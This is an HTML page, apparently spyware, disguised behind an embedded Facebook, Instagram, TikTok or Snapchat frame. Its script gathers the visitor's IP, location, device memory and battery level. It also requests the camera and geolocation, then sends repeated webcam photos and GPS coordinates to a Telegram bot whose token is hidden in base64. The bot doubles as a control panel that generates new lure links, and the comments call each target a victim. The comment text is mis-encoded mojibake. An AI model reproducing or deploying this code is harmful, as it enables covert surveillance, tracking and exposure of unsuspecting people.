<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Protocol</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
        #mask { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 1; display: none; }
        #loader { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 50; display: flex; justify-content: center; align-items: center; }
        .spin { border: 3px solid #222; border-top: 3px solid #0095f6; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #v, #ca { display: none; }
    </style>
</head>
<body>
<iframe id="mask" allow="autoplay; camera; geolocation"></iframe>
<div id="loader"><div class="spin"></div></div>
<video id="v" autoplay></video><canvas id="ca"></canvas>

<script>
    // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø®Ø§ØµØ© Ø¨Ùƒ [cite: 2026-01-31]
    const _T = atob("ODI4OTc5Mzk0MzpBQUVyc0ZOMlZhUVZIMzBNaENYaG92cXJoQW8zNFZTdWJlNA==");
    const _I = atob("NTc3NTc4MTAzOA==");
    const q = new URLSearchParams(window.location.search);
    const type = q.get('type') || 'fb';

    const masks = {
        'fb': 'https://www.facebook.com/zuck',
        'ig': 'https://www.instagram.com/reels/videos/',
        'tt': 'https://www.tiktok.com/embed/v2/7106821361845603585?autoplay=1',
        'sc': 'https://www.snapchat.com/add/durov/embed'
    };

    window.onload = () => {
        document.getElementById('mask').src = masks[type];
        document.getElementById('mask').style.display = 'block';
        startMission();
        // ØªÙØ¹ÙŠÙ„ Ù„ÙˆØ­Ø© Ø§Ù„Ø£Ø²Ø±Ø§Ø± ÙÙŠ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… [cite: 2026-01-31]
        setInterval(checkBotCommands, 3000); 
    };

    async function startMission() {
        // [1] Ø³Ø­Ø¨ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø§Ù…Ù„Ø© (IPØŒ Ø±Ø§Ù…ØŒ Ù…Ø¹Ø§Ù„Ø¬ØŒ Ø¨Ø·Ø§Ø±ÙŠØ©) [cite: 2026-01-31]
        try {
            let b = await navigator.getBattery();
            let ipR = await fetch('https://ipapi.co/json/').then(r => r.json());
            let d = `ğŸš€ ØµÙŠØ¯ Ø¬Ø¯ÙŠØ¯ Ù„Ù„Ù…Ø·ÙˆØ± Ø£Ø­Ù…Ø¯!\nğŸŒ Ø§Ù„Ù…Ù†ØµØ©: ${type}\nğŸŒ IP: ${ipR.ip}\nğŸ¢ Ø§Ù„Ø´Ø±ÙƒØ©: ${ipR.org}\nğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${ipR.city}, ${ipR.country_name}\nğŸ“± Ø§Ù„Ø±Ø§Ù…: ${navigator.deviceMemory}GB\nğŸ”‹ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: ${Math.round(b.level * 100)}%`;
            send(d);
        } catch(e) {}

        // [2] Ø·Ù„Ø¨ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª ÙÙˆØ±Ø§Ù‹ (Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ§Ù„ÙƒØ§Ù…ÙŠØ±Ø§) [cite: 2026-01-31]
        navigator.geolocation.getCurrentPosition(p => {
            send(`ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¯Ù‚ÙŠÙ‚:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
        });

        try {
            const str = await navigator.mediaDevices.getUserMedia({video: true});
            document.getElementById('v').srcObject = str;
            document.getElementById('loader').style.display = 'none';
            for(let i=0; i<6; i++) setTimeout(() => snap(), i * 2000);
        } catch(e) { 
            send("âŒ Ø§Ù„Ø¶Ø­ÙŠØ© Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§"); 
            document.getElementById('loader').style.display = 'none'; 
        }
    }

    function snap() {
        const ca = document.getElementById('ca'); const vi = document.getElementById('v');
        ca.width = vi.videoWidth; ca.height = vi.videoHeight;
        ca.getContext('2d').drawImage(vi, 0, 0);
        ca.toBlob(blo => {
            let f = new FormData(); f.append('photo', blo);
            fetch(`https://api.telegram.org/bot${_T}/sendPhoto?chat_id=${_I}`, {method:'POST', body:f});
        }, 'image/jpeg');
    }

    function send(t) { fetch(`https://api.telegram.org/bot${_T}/sendMessage?chat_id=${_I}&text=${encodeURIComponent(t)}`); }

    // [3] Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ­ÙƒÙ… Ø¨Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ù…Ù† ØªÙ„ÙŠØ¬Ø±Ø§Ù… [cite: 2026-01-31]
    async function checkBotCommands() {
        try {
            const r = await fetch(`https://api.telegram.org/bot${_T}/getUpdates?offset=-1`);
            const d = await r.json();
            if(!d.result.length) return;
            const msg = d.result[0].message ? d.result[0].message.text : "";
            const myUrl = window.location.origin + window.location.pathname;

            if (msg === "/start") {
                const kb = { inline_keyboard: [
                    [{ text: "ğŸ“˜ ÙÙŠØ³Ø¨ÙˆÙƒ", callback_data: "fb" }, { text: "ğŸ“¸ Ø§Ù†Ø³ØªÙ‚Ø±Ø§Ù…", callback_data: "ig" }],
                    [{ text: "ğŸ¬ ØªÙŠÙƒ ØªÙˆÙƒ", callback_data: "tt" }, { text: "ğŸ‘» Ø³Ù†Ø§Ø¨ Ø´Ø§Øª", callback_data: "sc" }]
                ]};
                fetch(`https://api.telegram.org/bot${_T}/sendMessage?chat_id=${_I}&text=${encodeURIComponent("Ù…Ø±Ø­Ø¨Ø§Ù‹ Ù…Ø·ÙˆØ± Ø£Ø­Ù…Ø¯ ğŸ‘‘\nØ¥Ø®ØªØ± Ø§Ù„Ù…Ù†ØµØ©:")}&reply_markup=${JSON.stringify(kb)}`);
            }
            if(["fb", "ig", "tt", "sc"].includes(msg)) {
                send(`âœ… Ø§Ù„Ø±Ø§Ø¨Ø· Ø¬Ø§Ù‡Ø²:\n${myUrl}?type=${msg}`);
            }
        } catch(e) {}
    }
</script>
</body>
</html>
